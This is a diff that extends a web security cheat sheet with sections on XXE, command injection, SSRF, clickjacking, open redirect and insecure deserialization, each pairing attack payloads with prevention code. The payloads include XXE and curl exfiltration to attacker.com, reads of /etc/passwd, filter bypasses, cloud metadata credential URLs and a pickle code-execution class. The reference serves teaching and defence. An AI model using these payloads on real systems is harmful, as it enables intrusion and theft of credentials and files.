@@ -8,6 +8,12 @@ Quick reference for web application security, OWASP Top 10, and common vulnerabi
 - [SQL Injection](#sql-injection)
 - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
 - [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
+- [XXE (XML External Entity)](#xxe-xml-external-entity)
+- [Command Injection](#command-injection)
+- [SSRF (Server-Side Request Forgery)](#ssrf-server-side-request-forgery)
+- [Clickjacking](#clickjacking)
+- [Open Redirect](#open-redirect)
+- [Insecure Deserialization](#insecure-deserialization)
 - [Authentication & Session Management](#authentication--session-management)
 - [Security Misconfigurations](#security-misconfigurations)
 - [File Upload Vulnerabilities](#file-upload-vulnerabilities)
@@ -513,6 +519,449 @@ setcookie('session', $value, [
 if (!str_starts_with($_SERVER['HTTP_REFERER'], 'https://yoursite.com/')) {
     die('Invalid request');
 }
+```
+
+## 🔀 XXE (XML External Entity)
+
+### What is XXE?
+XML External Entity attacks exploit vulnerable XML parsers that process external entity references.
+
+### Attack Examples
+
+**Basic XXE (File Disclosure):**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+```
+
+**XXE to SSRF:**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM "http://internal-server/admin">
+]>
+<foo>&xxe;</foo>
+```
+
+**Blind XXE (Out-of-Band):**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  %xxe;
+]>
+<foo>&exfil;</foo>
+```
+
+**evil.dtd:**
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+%eval;
+%exfil;
+```
+
+**Billion Laughs (DoS):**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<lolz>&lol4;</lolz>
+```
+
+### Prevention
+
+```python
+# Python - Disable external entities
+import defusedxml.ElementTree as ET
+tree = ET.parse('file.xml')
+
+# Java - Disable DTDs
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+
+# PHP - Disable external entities
+libxml_disable_entity_loader(true);
+
+# .NET - Secure settings
+XmlReaderSettings settings = new XmlReaderSettings();
+settings.DtdProcessing = DtdProcessing.Prohibit;
+```
+
+## 💻 Command Injection
+
+### Attack Examples
+
+**Basic Command Injection:**
+```bash
+# Vulnerable code: system("ping -c 4 " . $_GET['host']);
+
+# Payloads:
+; ls -la
+&& whoami
+| cat /etc/passwd
+`whoami`
+$(cat /etc/passwd)
+```
+
+**Command Chaining:**
+```bash
+; cat /etc/passwd
+&& cat /etc/passwd  # Execute if previous succeeds
+|| cat /etc/passwd  # Execute if previous fails
+| cat /etc/passwd   # Pipe output
+```
+
+**Blind Command Injection:**
+```bash
+# Time-based detection
+; sleep 10
+&& ping -c 10 127.0.0.1
+
+# Out-of-band
+; curl http://attacker.com?data=$(whoami)
+; nslookup `whoami`.attacker.com
+```
+
+**Bypass Filters:**
+```bash
+# Spaces
+cat</etc/passwd
+{cat,/etc/passwd}
+cat$IFS/etc/passwd
+
+# Quotes
+c'a't /etc/passwd
+c"a"t /etc/passwd
+
+# Backslashes
+c\at /etc/passwd
+
+# Wildcards
+cat /etc/pass*
+cat /???/passwd
+```
+
+### Prevention
+
+```python
+import subprocess
+import shlex
+
+# Use array instead of shell=True
+subprocess.run(['ping', '-c', '4', user_input])
+
+# Validate input
+if re.match(r'^[a-zA-Z0-9.-]+$', host):
+    subprocess.run(['ping', '-c', '4', host])
+```
+
+## 🌐 SSRF (Server-Side Request Forgery)
+
+### Attack Examples
+
+**Basic SSRF:**
+```
+http://example.com/fetch?url=http://localhost:22
+http://example.com/fetch?url=http://127.0.0.1:6379
+http://example.com/fetch?url=http://192.168.1.1/admin
+```
+
+**AWS Metadata:**
+```
+http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
+http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+**Cloud Metadata Services:**
+```bash
+# AWS
+http://169.254.169.254/latest/meta-data/
+
+# Google Cloud
+http://metadata.google.internal/computeMetadata/v1/
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1/
+```
+
+**File Protocol:**
+```
+http://example.com/fetch?url=file:///etc/passwd
+http://example.com/fetch?url=file:///var/www/config.php
+```
+
+**Bypass Filters:**
+```
+# Localhost variations
+http://127.0.0.1
+http://127.1
+http://0.0.0.0
+http://0177.0.0.1  (octal)
+http://2130706433  (decimal)
+http://[::1]       (IPv6)
+http://localhost.example.com  (DNS to 127.0.0.1)
+
+# URL encoding
+http://127.0.0.1 → http://127.0.0.%31
+
+# Domain tricks
+http://127.0.0.1.nip.io
+http://127.0.0.1.xip.io
+```
+
+### Prevention
+
+```python
+from urllib.parse import urlparse
+import ipaddress
+import socket
+
+ALLOWED_DOMAINS = ['api.trusted.com']
+
+def is_safe_url(url):
+    parsed = urlparse(url)
+    
+    # Check scheme
+    if parsed.scheme not in ['http', 'https']:
+        return False
+    
+    # Check domain whitelist
+    if parsed.hostname not in ALLOWED_DOMAINS:
+        return False
+    
+    # Resolve and check IP
+    try:
+        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
+        if ip.is_private or ip.is_loopback or ip.is_link_local:
+            return False
+    except Exception:
+        return False
+    
+    return True
+```
+
+## 🖱️ Clickjacking
+
+### Attack Examples
+
+**Basic Clickjacking:**
+```html
+<style>
+    iframe {
+        position: absolute;
+        width: 500px;
+        height: 500px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    button {
+        position: absolute;
+        top: 270px;
+        left: 180px;
+        z-index: 1;
+    }
+</style>
+
+<button>Click for Prize!</button>
+<iframe src="http://bank.com/transfer?to=attacker&amount=1000"></iframe>
+```
+
+**Likejacking:**
+```html
+<!-- Trick users into liking a Facebook page -->
+<iframe src="https://www.facebook.com/plugins/like.php?href=http://attacker.com"></iframe>
+```
+
+**Cursorjacking:**
+```html
+<style>
+    * { cursor: none; }
+    #fake-cursor {
+        position: absolute;
+        pointer-events: none;
+    }
+</style>
+<img id="fake-cursor" src="cursor.png">
+<script>
+    // Move fake cursor with offset
+    document.onmousemove = function(e) {
+        document.getElementById('fake-cursor').style.left = (e.pageX - 50) + 'px';
+        document.getElementById('fake-cursor').style.top = (e.pageY - 50) + 'px';
+    }
+</script>
+```
+
+### Prevention
+
+**X-Frame-Options Header:**
+```
+X-Frame-Options: DENY
+X-Frame-Options: SAMEORIGIN
+X-Frame-Options: ALLOW-FROM https://trusted.com
+```
+
+**Content Security Policy:**
+```
+Content-Security-Policy: frame-ancestors 'none'
+Content-Security-Policy: frame-ancestors 'self'
+Content-Security-Policy: frame-ancestors https://trusted.com
+```
+
+**Frame-busting JavaScript:**
+```javascript
+// Prevent framing
+if (top !== self) {
+    top.location = self.location;
+}
+```
+
+## 🔀 Open Redirect
+
+### Attack Examples
+
+**URL Parameter Redirect:**
+```
+http://example.com/redirect?url=http://evil.com
+http://example.com/redirect?next=/login  # Good
+http://example.com/redirect?next=//evil.com  # Bad
+```
+
+**Header-Based Redirect:**
+```
+http://example.com/redirect?url=https://evil.com
+```
+
+**Bypass Techniques:**
+```
+# Protocol-relative URL
+//evil.com
+
+# Whitelist bypass
+http://example.com@evil.com
+http://example.com.evil.com
+http://example.com/redirect?url=https://example.com.evil.com
+
+# URL encoding
+http://example.com/redirect?url=https%3A%2F%2Fevil.com
+
+# Open redirect chain
+http://trusted.com/redirect?url=http://example.com/redirect?url=http://evil.com
+```
+
+### Prevention
+
+```python
+from urllib.parse import urlparse
+
+ALLOWED_DOMAINS = ['example.com', 'app.example.com']
+
+@app.route('/redirect')
+def redirect_url():
+    url = request.args.get('url', '/')
+    
+    # Only allow relative URLs
+    if url.startswith('/') and not url.startswith('//'):
+        return redirect(url)
+    
+    # Or validate domain
+    parsed = urlparse(url)
+    if parsed.netloc in ALLOWED_DOMAINS:
+        return redirect(url)
+    
+    return abort(400, "Invalid redirect URL")
+```
+
+## 🔓 Insecure Deserialization
+
+### Attack Examples
+
+**Python Pickle:**
+```python
+# Malicious pickle payload
+import pickle
+import os
+
+class EvilClass:
+    def __reduce__(self):
+        return (os.system, ('whoami',))
+
+payload = pickle.dumps(EvilClass())
+# Send payload to vulnerable application
+
+# Vulnerable code:
+data = pickle.loads(user_input)  # DANGEROUS!
+```
+
+**Java Deserialization:**
+```java
+// Vulnerable code
+ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
+Object obj = ois.readObject();  // DANGEROUS!
+
+// Tools: ysoserial
+java -jar ysoserial.jar CommonsCollections1 'calc' | base64
+```
+
+**PHP Deserialization:**
+```php
+// Vulnerable code
+$data = unserialize($_COOKIE['data']);  // DANGEROUS!
+
+// Magic methods exploited:
+class Evil {
+    function __wakeup() {
+        system($this->cmd);
+    }
+}
+```
+
+**Node.js:**
+```javascript
+// Vulnerable code
+var obj = eval('(' + userInput + ')');  // DANGEROUS!
+
+// Or with node-serialize
+var serialize = require('node-serialize');
+var obj = serialize.unserialize(userInput);  // Can be dangerous
+```
+
+### Prevention
+
+```python
+# Use safe formats
+import json
+data = json.loads(user_input)  # Safe for data
+
+# Or validate signature
+import hmac
+import hashlib
+
+def serialize_secure(obj):
+    data = json.dumps(obj)
+    sig = hmac.new(SECRET_KEY, data.encode(), hashlib.sha256).hexdigest()
+    return base64.b64encode(f"{sig}:{data}".encode())
+
+def deserialize_secure(payload):
+    decoded = base64.b64decode(payload).decode()
+    sig, data = decoded.split(':', 1)
+    expected_sig = hmac.new(SECRET_KEY, data.encode(), hashlib.sha256).hexdigest()
+    if not hmac.compare_digest(sig, expected_sig):
+        raise ValueError("Invalid signature")
+    return json.loads(data)
 ```
 
 ## 🔑 Authentication & Session Management
